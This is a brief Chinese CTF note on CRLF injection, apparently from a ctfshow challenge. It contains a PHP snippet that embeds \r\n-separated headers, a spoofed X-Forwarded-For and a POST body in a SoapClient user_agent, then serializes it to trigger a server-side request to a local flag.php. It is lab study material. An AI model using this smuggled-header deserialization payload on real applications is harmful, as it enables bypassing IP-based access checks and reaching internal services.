
CRLF漏洞是一种网络安全漏洞，指的是回车（Carriage Return，CR）和换行（Line Feed，LF）字符被恶意利用的情况

```
即用\r\n(%0d%0a)进行注入

格式：

User-Agent: feng
x-forwarded-for:127.0.0.1,127.0.0.1
Content-type:application/x-www-form-urlencoded
Content-length:13

token=ctfshow
```

```
可以构造成

<?php
$a = new SoapClient(null,
    array(
        'user_agent' => "zz\r\nx-forwarded-for:127.0.0.1,127.0.0.1\r\nContent-type:application/x-www-form-urlencoded\r\nContent-length:13\r\n\r\ntoken=ctfshow",
        'uri' => 'zz',
        'location' => 'http://127.0.0.1/flag.php'
    )
);
$b = serialize($a);
echo urlencode($b);
?>
```
